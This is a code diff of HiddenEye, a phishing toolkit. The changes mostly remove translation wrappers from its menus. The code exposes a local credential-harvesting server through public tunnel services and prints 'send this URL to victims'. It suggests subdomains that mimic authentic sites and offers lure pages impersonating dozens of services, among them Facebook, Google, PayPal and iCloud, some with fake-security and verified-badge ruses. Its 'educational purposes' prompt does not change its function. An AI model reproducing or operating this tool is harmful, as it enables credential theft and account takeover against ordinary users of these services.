@@ -14,6 +14,7 @@ from Defs.ThemesManager import colorSelector
 from Defs.Configurations import readConfig, ifSettingsNotExists
 from Defs.Languages import *
 
+
 installGetText()
 languageSelector()
 ifSettingsNotExists()
@@ -134,13 +135,13 @@ def runPhishing(page , customOption): #Phishing pages selection menu
 
 def selectPort(): #Question where user must select port
         system('clear')
-        print(_('''
+        print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ WEBSERVER PORT SELECTION ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
-        print(_("\n {0}[{1}*{0}]{0}Select Any Available Port [1-65535]:{1}").format(MAIN0, MAIN4))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ WEBSERVER PORT SELECTION ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
+        print("\n {0}[{1}*{0}]{0}Select Any Available Port [1-65535]:{1}".format(MAIN0, MAIN4))
         choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
         try:
             if (int(choice) > 65535 or int(choice) < 1):
@@ -152,14 +153,14 @@ def selectPort(): #Question where user must select port
 
 def selectServer(port): #Question where user must select server
         system('clear')
-        print(_('''
+        print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ HOST SERVER SELECTION ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
-        print(_("\n {0}[{1}*{0}]{0}Select Any Available Server:{1}").format(MAIN0, MAIN4))
-        print(_("\n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo\n {0}[{1}3{0}]{1}Localxpose\n {0}[{1}4{0}]{1}Localtunnel (Package Version)\n {0}[{1}5{0}]{1}Localtunnel (Binary Version)[Buggy]").format(MAIN0, MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ HOST SERVER SELECTION ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
+        print("\n {0}[{1}*{0}]{0}Select Any Available Server:{1}".format(MAIN0, MAIN4))
+        print("\n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo\n {0}[{1}3{0}]{1}Localxpose\n {0}[{1}4{0}]{1}Localtunnel (Package Version)\n {0}[{1}5{0}]{1}Localtunnel (Binary Version)[Buggy]".format(MAIN0, MAIN2))
 
         choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
         if choice == '1':
@@ -181,12 +182,12 @@ def selectServer(port): #Question where user must select server
             system('clear')
             return selectServer(port)
 def runNgrok(port):
-            print(_('''
+            print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ NGROK SERVER ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ NGROK SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
             
             system('./Server/ngrok http {} > /dev/null &'.format(port))
             while True:
@@ -196,19 +197,19 @@ def runNgrok(port):
                 url = urlFile.read()
                 urlFile.close()
                 if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
-                    print(_("\n{0}[{1}!{0}]{1} SEND THIS NGROK URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} NGROK URL: {2}".format(MAIN0, MAIN2, MAIN3, port) + url + "{1}").format(MAIN0, MAIN4, MAIN3))
+                    print("\n{0}[{1}!{0}]{1} SEND THIS NGROK URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} NGROK URL: {2}".format(MAIN0, MAIN2, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
                     print("\n")  
                     break
                     
 def runLocalxpose(port):
-    print(_('''
+    print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALXPOSE URL TYPE SELECTION ]{1}!! {0}\n-------------------------------\n''').format(MAIN0, MAIN2))
-    print(_("\n{0}[{1}*{0}]{0}CHOOSE ANY LOCALXPOSE URL TYPE TO GENERATE PHISHING LINK:{1}").format(MAIN0, MAIN2))
-    print(_("\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)").format(MAIN0, MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALXPOSE URL TYPE SELECTION ]{1}!! {0}\n-------------------------------\n'''.format(MAIN0, MAIN2))
+    print("\n{0}[{1}*{0}]{0}CHOOSE ANY LOCALXPOSE URL TYPE TO GENERATE PHISHING LINK:{1}".format(MAIN0, MAIN2))
+    print("\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)".format(MAIN0, MAIN2))
     choice = input("\n\n{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4, MAIN2))
     system('clear')
     if choice == '1':
@@ -222,48 +223,48 @@ def runLocalxpose(port):
 
 def customLocalxpose(port):
 
-    print(_('''
+    print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n{0}[{1}!{0}]{1} YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}Insert a custom subdomain for Localxpose(Ex: mysubdomain)''').format(MAIN0, MAIN2))
-    lnk = input(_("\n{0}CUSTOM Subdomain>>> {2}").format(MAIN0, MAIN4, MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n{0}[{1}!{0}]{1} YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}Insert a custom subdomain for Localxpose(Ex: mysubdomain)'''.format(MAIN0, MAIN2))
+    lnk = input("\n{0}CUSTOM Subdomain>>> {2}".format(MAIN0, MAIN4, MAIN2))
     system('./Server/loclx tunnel http --to :%s --subdomain %s > link.url 2> /dev/null &' % (port,lnk))
     sleep(7)
     try:
         output = check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url",shell=True)
-        url = str(output).strip("b ' \ n r")
+        url = str(output).decode("utf-8")
         system('clear')
-        print(_('''
+        print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
         print("\n{0}[{1}!{0}]{1} SEND THIS LOCALXPOSE URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALXPOSE URL: {2}".format(MAIN0, MAIN2, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
         print("\n")
 
     except CalledProcessError:
-        print (_('''\n\n{0}FAILED TO GET THIS DOMAIN. !!!\n\n{0}LOOKS LIKE CUSTOM URL IS NOT VALID or ALREADY OCCUPIED BY SOMEONE ELSE. !!!\n\n{0}[{1}!{0}]TRY TO SELECT ANOTHER CUSTOM DOMAIN{1} (GOING BACK).. !! \n
-''').format(MAIN0, MAIN4))
+        print('''\n\n{0}FAILED TO GET THIS DOMAIN. !!!\n\n{0}LOOKS LIKE CUSTOM URL IS NOT VALID or ALREADY OCCUPIED BY SOMEONE ELSE. !!!\n\n{0}[{1}!{0}]TRY TO SELECT ANOTHER CUSTOM DOMAIN{1} (GOING BACK).. !! \n
+'''.format(MAIN0, MAIN4))
         sleep(4)
         system('clear')
         return customLocalxpose(port)
 
 def randomLocalxpose(port):
     system('clear')
-    print(_('''
+    print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RANDOM LOCALXPOSE URL ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RANDOM LOCALXPOSE URL ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
     system('./Server/loclx tunnel http --to :%s > link.url 2> /dev/null &' % (port))
     sleep(8)
     try:
         output = check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url",shell=True)
-        url = str(output).strip("b ' \ n r")
+        url = str(output).decode("utf-8")
         print("\n{0}[{1}!{0}]{1} SEND THIS LOCALXPOSE URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALXPOSE URL: {2}".format(MAIN0, MAIN4, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
         print("\n")
     except CalledProcessError:
@@ -273,14 +274,14 @@ def randomLocalxpose(port):
         return randomLocalxpose(port)
                 
 def runServeo(port):
-    print(_('''
+    print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ SERVEO URL TYPE SELECTION ]{1}!! {0}\n-------------------------------\n{0}[{1}!{0}]{1}REMEMBER ? Serveo Don't Allows Phishing.\n{0}[{1}!{0}]{1}They Drops The Connection Whenever Detects Phishing. ''').format(MAIN0, MAIN2))
-    print(_("\n{0}[{1}*{0}]{0}CHOOSE ANY SERVEO URL TYPE TO GENERATE PHISHING LINK:{1}").format(MAIN0, MAIN2))
-    print(_("\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)").format(MAIN0, MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ SERVEO URL TYPE SELECTION ]{1}!! {0}\n-------------------------------\n{0}[{1}!{0}]{1}REMEMBER ? Serveo Don't Allows Phishing.\n{0}[{1}!{0}]{1}They Drops The Connection Whenever Detects Phishing. '''.format(MAIN0, MAIN2))
+    print("\n{0}[{1}*{0}]{0}CHOOSE ANY SERVEO URL TYPE TO GENERATE PHISHING LINK:{1}".format(MAIN0, MAIN2))
+    print("\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)".format(MAIN0, MAIN2))
     choice = input("\n\n{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4, MAIN2))
     system('clear')
     if choice == '1':
@@ -294,13 +295,13 @@ def runServeo(port):
 
 def customServeo(port):
 
-    print(_('''
+    print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n{0}[{1}!{0}]{1} YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}Insert a custom subdomain for serveo''').format(MAIN0, MAIN2))
-    lnk = input(_("\n{0}CUSTOM Subdomain>>> {2}").format(MAIN0, MAIN4, MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n{0}[{1}!{0}]{1} YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}Insert a custom subdomain for serveo'''.format(MAIN0, MAIN2))
+    lnk = input("\n{0}CUSTOM Subdomain>>> {2}".format(MAIN0, MAIN4, MAIN2))
     if not ".serveo.net" in lnk:
         lnk += ".serveo.net"
     else:
@@ -309,37 +310,37 @@ def customServeo(port):
     sleep(7)
     try:
         output = check_output("grep -o '.\{0,0\}http.\{0,100\}' link.url",shell=True)
-        url = str(output).strip("b ' \ n r")
+        url = str(output).decode("utf-8")
         system('clear')
-        print(_('''
+        print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
         print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(MAIN0, MAIN2, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
         print("\n")
 
     except CalledProcessError:
-        print (_('''\n\n{0}FAILED TO GET THIS DOMAIN. !!!\n\n{0}LOOKS LIKE CUSTOM URL IS NOT VALID or ALREADY OCCUPIED BY SOMEONE ELSE. !!!\n\n{0}[{1}!{0}]TRY TO SELECT ANOTHER CUSTOM DOMAIN{1} (GOING BACK).. !! \n
-''').format(MAIN0, MAIN4))
+        print('''\n\n{0}FAILED TO GET THIS DOMAIN. !!!\n\n{0}LOOKS LIKE CUSTOM URL IS NOT VALID or ALREADY OCCUPIED BY SOMEONE ELSE. !!!\n\n{0}[{1}!{0}]TRY TO SELECT ANOTHER CUSTOM DOMAIN{1} (GOING BACK).. !! \n
+'''.format(MAIN0, MAIN4))
         sleep(4)
         system('clear')
         return customServeo(port)
 
 def randomServeo(port):
     system('clear')
-    print(_('''
+    print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RANDOM SERVEO URL ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RANDOM SERVEO URL ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
     system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > link.url 2> /dev/null &' % (port))
     sleep(8)
     try:
         output = check_output("grep -o '.\{0,0\}http.\{0,100\}' link.url",shell=True)
-        url = str(output).strip("b ' \ n r")
+        url = str(output).decode("utf-8")
         print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(MAIN0, MAIN4, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
         print("\n")
     except CalledProcessError:
@@ -350,58 +351,59 @@ def randomServeo(port):
 
 def runLT(port,npm):
     system('clear')
-    print(_('''
+    print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL  ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
-    print(_("\n{0}[{1}*{0}]{0}SELECT ANY URL TYPE TO GENERATE PHISHING LINK:{1}").format(MAIN0, MAIN2))
-    print(_("\n{0}[{1}+{0}]{1}Type Subdomain for Custom URL. \n{0}[{1}+{0}]{1}Leave Empty For Random URL").format(MAIN0, MAIN2))
-    s=input(('\n{0}(Localtunnel/Subdomain)> {2}').format(MAIN0,MAIN4,MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL  ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
+    print("\n{0}[{1}*{0}]{0}SELECT ANY URL TYPE TO GENERATE PHISHING LINK:{1}".format(MAIN0, MAIN2))
+    print("\n{0}[{1}+{0}]{1}Type Subdomain for Custom URL. \n{0}[{1}+{0}]{1}Leave Empty For Random URL".format(MAIN0, MAIN2))
+    s=input('\n{0}(Localtunnel/Subdomain)> {2}'.format(MAIN0,MAIN4,MAIN2))
     try:
         system('{0}lt -p '.format('' if npm else 'Server/')+port+((' -s '+s) if s!='' else s)+' > link.url &')
         sleep(3)
         system('clear')
-        print(_('''
+        print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
         print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALTUNNEL URL: {2}{4}".format(MAIN0, MAIN2, MAIN3, port, str(check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url",shell=True)).strip("b ' \ n r")))
     except CalledProcessError:
         system('clear')
-        print(_('''
+        print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
         print('{0}error[invalid/preoccupied]{0}'.format(MAIN0))
         runLT(port,npm)
 
 def runMainMenu(): #menu where user select what they wanna use
 
     if 256 != system('which php > /dev/null'): #Checking if user have PHP
-        print (_(" {2}* {0}PHP INSTALLATION FOUND").format(MAIN2, MAIN4, MAIN0))
+        print(" {2}* {0}PHP INSTALLATION FOUND".format(MAIN2, MAIN4, MAIN0))
     else:
-        print (_("{0}**{2} PHP NOT FOUND: \n {0}~{1} Please install PHP and run me again.http://www.php.net/").format(MAIN2, MAIN4, MAIN0))
+        print("{0}**{2} PHP NOT FOUND: \n {0}~{1} Please install PHP and run me again.http://www.php.net/".format(MAIN2, MAIN4, MAIN0))
 
     for i in range(101):
-        sleep(0.005)
+        sleep(0.00275)
         stdout.write("\r")
-        stdout.write(_("{0}[{1}*{0}]{1} HiddenEye is Opening. Please Wait...{2}%").format(MAIN0, MAIN4, i))
+        stdout.write("{0}[{1}*{0}]{1} HiddenEye is Opening. Please Wait...{2}%".format(MAIN0, MAIN4, i))
         stdout.flush()
 
-    if input(_("\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational purposes only? ({0}Y{1}/{2}N{1})\n{2}HiddenEye >>> {0}").format(MAIN2, MAIN4, MAIN0)).upper() != 'Y' : #Question where user must accept education purposes
+    # Terms Of Service
+    if input("\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational purposes only? ({0}Y{1}/{2}N{1})\n{2}HiddenEye >>> {0}".format(MAIN2, MAIN4, MAIN0)).upper() != 'Y' :
         system('clear')
-        print (_('\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.!{1} ]\n\n').format(MAIN0, MAIN4))
-        exit(0)
+        print("\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.!{1} ]\n\n".format(MAIN0, MAIN4))
+        exit()
 
 def mainMenu():
     system('clear')
-    print (_('''
+    print('''
 
  {2} ██   ██ ██ ██████   ██████   ███████ ███   ██  {3}███████ ██    ██ ███████ {1}
  {2} ██   ██ ██ ██    ██ ██    ██ ██      ████  ██  {3}██       ██  ██  ██      {1}
@@ -411,29 +413,29 @@ def mainMenu():
                                                       {3}[{1}v{3}0{1}.{3}4{1}.{3}1{3}]{1} BY:DARKSEC{2}
              {3}[{2} Modern Phishing Tool With Advanced Functionality {3}]
 {3}[{2} PHISHING-KEYLOGGER-INFORMATION COLLECTOR-ALL_IN_ONE_TOOL-SOCIALENGINEERING {3}]
-________________________________________________________________________________''').format(MAIN3, MAIN4, MAIN2, MAIN0))
-    print (_("------------------------\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n------------------------").format(MAIN0, MAIN2))
-    print (_(" {0}[{1}1{0}]{1} Facebook        {0}[{1}13{0}]{1} Steam          {0}[{1}25{0}]{1} Badoo           {0}[{1}37{0}]{1} PlayStation").format(MAIN0, MAIN2))
-    print (_(" {0}[{1}2{0}]{1} Google          {0}[{1}14{0}]{1} VK             {0}[{1}26{0}]{1} CryptoCurrency").format(MAIN0, MAIN2))
-    print (_(" {0}[{1}3{0}]{1} LinkedIn        {0}[{1}15{0}]{1} iCloud         {0}[{1}27{0}]{1} DevianArt ").format(MAIN0, MAIN2))
-    print (_(" {0}[{1}4{0}]{1} GitHub          {0}[{1}16{0}]{1} GitLab         {0}[{1}28{0}]{1} DropBox  ").format(MAIN0, MAIN2))
-    print (_(" {0}[{1}5{0}]{1} StackOverflow   {0}[{1}17{0}]{1} Netflix        {0}[{1}29{0}]{1} eBay  ").format(MAIN0, MAIN2))
-    print (_(" {0}[{1}6{0}]{1} WordPress       {0}[{1}18{0}]{1} Origin         {0}[{1}30{0}]{1} MySpace ").format(MAIN0, MAIN2))
-    print (_(" {0}[{1}7{0}]{1} Twitter         {0}[{1}19{0}]{1} Pinterest      {0}[{1}31{0}]{1} PayPal ").format(MAIN0, MAIN2))                 
-    print (_(" {0}[{1}8{0}]{1} Instagram       {0}[{1}20{0}]{1} ProtonMail     {0}[{1}32{0}]{1} Shopify").format(MAIN0, MAIN2))
-    print (_(" {0}[{1}9{0}]{1} Snapchat        {0}[{1}21{0}]{1} Spotify        {0}[{1}33{0}]{1} Verizon ").format(MAIN0, MAIN2))
-    print (_(" {0}[{1}10{0}]{1} Yahoo          {0}[{1}22{0}]{1} Quora          {0}[{1}34{0}]{1} Yandex ").format(MAIN0, MAIN2))
-    print (_(" {0}[{1}11{0}]{1} Twitch         {0}[{1}23{0}]{1} PornHub        {0}[{1}35{0}]{1} Reddit ").format(MAIN0, MAIN2))
-    print (_(" {0}[{1}12{0}]{1} Microsoft      {0}[{1}24{0}]{1} Adobe          {0}[{1}36{0}]{1} Subito.it ").format(MAIN0, MAIN2))
+________________________________________________________________________________'''.format(MAIN3, MAIN4, MAIN2, MAIN0))
+    print("------------------------\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n------------------------".format(MAIN0, MAIN2))
+    print(" {0}[{1}1{0}]{1} Facebook        {0}[{1}13{0}]{1} Steam          {0}[{1}25{0}]{1} Badoo           {0}[{1}37{0}]{1} PlayStation".format(MAIN0, MAIN2))
+    print(" {0}[{1}2{0}]{1} Google          {0}[{1}14{0}]{1} VK             {0}[{1}26{0}]{1} CryptoCurrency".format(MAIN0, MAIN2))
+    print(" {0}[{1}3{0}]{1} LinkedIn        {0}[{1}15{0}]{1} iCloud         {0}[{1}27{0}]{1} DevianArt ".format(MAIN0, MAIN2))
+    print(" {0}[{1}4{0}]{1} GitHub          {0}[{1}16{0}]{1} GitLab         {0}[{1}28{0}]{1} DropBox  ".format(MAIN0, MAIN2))
+    print(" {0}[{1}5{0}]{1} StackOverflow   {0}[{1}17{0}]{1} Netflix        {0}[{1}29{0}]{1} eBay  ".format(MAIN0, MAIN2))
+    print(" {0}[{1}6{0}]{1} WordPress       {0}[{1}18{0}]{1} Origin         {0}[{1}30{0}]{1} MySpace ".format(MAIN0, MAIN2))
+    print(" {0}[{1}7{0}]{1} Twitter         {0}[{1}19{0}]{1} Pinterest      {0}[{1}31{0}]{1} PayPal ".format(MAIN0, MAIN2))                 
+    print(" {0}[{1}8{0}]{1} Instagram       {0}[{1}20{0}]{1} ProtonMail     {0}[{1}32{0}]{1} Shopify".format(MAIN0, MAIN2))
+    print(" {0}[{1}9{0}]{1} Snapchat        {0}[{1}21{0}]{1} Spotify        {0}[{1}33{0}]{1} Verizon ".format(MAIN0, MAIN2))
+    print(" {0}[{1}10{0}]{1} Yahoo          {0}[{1}22{0}]{1} Quora          {0}[{1}34{0}]{1} Yandex ".format(MAIN0, MAIN2))
+    print(" {0}[{1}11{0}]{1} Twitch         {0}[{1}23{0}]{1} PornHub        {0}[{1}35{0}]{1} Reddit ".format(MAIN0, MAIN2))
+    print(" {0}[{1}12{0}]{1} Microsoft      {0}[{1}24{0}]{1} Adobe          {0}[{1}36{0}]{1} Subito.it ".format(MAIN0, MAIN2))
     
-    option = input(_("{0}HiddenEye >>>  {1}").format(MAIN0, MAIN2))
+    option = input("{0}HiddenEye >>>  {1}".format(MAIN0, MAIN2))
     if option == '1':
         loadModule('Facebook')
-        customOption = input(_("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n{0}HiddenEye >>> {2}").format(MAIN0, MAIN2, MAIN2))
+        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
         runPhishing('Facebook', customOption)
     elif option == '2':
         loadModule('Google')
-        customOption = input(_("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n {0}[{1}3{0}]{1} New Google Web\n{0}HiddenEye >>> {2}").format(MAIN0, MAIN2, MAIN2))
+        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n {0}[{1}3{0}]{1} New Google Web\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
         runPhishing('Google', customOption)
     elif option == '3':
         loadModule('LinkedIn')
@@ -457,7 +459,7 @@ ________________________________________________________________________________
         runPhishing('Twitter', customOption)
     elif option == '8':
         loadModule('Instagram')
-        customOption = input(_("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (To Lure The Users)\n {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)\n {0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge){1} *[NEW]*\n {0}[{1}5{0}]{1} Instafollower (Lure To Get More Followers){1} *[NEW]*\n{0}HiddenEye >>> {2}").format(MAIN0, MAIN2, MAIN2))
